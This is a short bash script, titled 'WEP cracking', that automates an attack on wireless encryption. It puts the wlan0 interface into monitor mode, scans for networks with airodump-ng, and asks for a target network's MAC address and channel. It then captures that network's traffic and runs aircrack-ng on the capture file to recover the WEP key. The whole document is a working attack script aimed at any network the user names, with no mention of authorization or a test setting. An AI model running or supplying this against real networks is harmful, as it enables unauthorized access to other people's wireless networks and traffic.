#!/bin/bash

##############################
#       WEP CRACKING         #
##############################


# Requires airodump-ng package
# This script attempts to crack WEP encryption
# WEP uses RC4 where packet is encrypted at the AP and decrypted at the client
# Must capture packets with the initializing vector (IV) to get the key

ifconfig wlan0 down
iwconfig wlan0 mode monitor

airodump-ng wlan0

echo "What network do you want to target?"
read host_mac

echo "What channel is the network on?"
read ch

airodump-ng --bssid $host_mac --channel $ch --write basic-test wlan0 && aircrack-ng basic-test-01.cap

ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
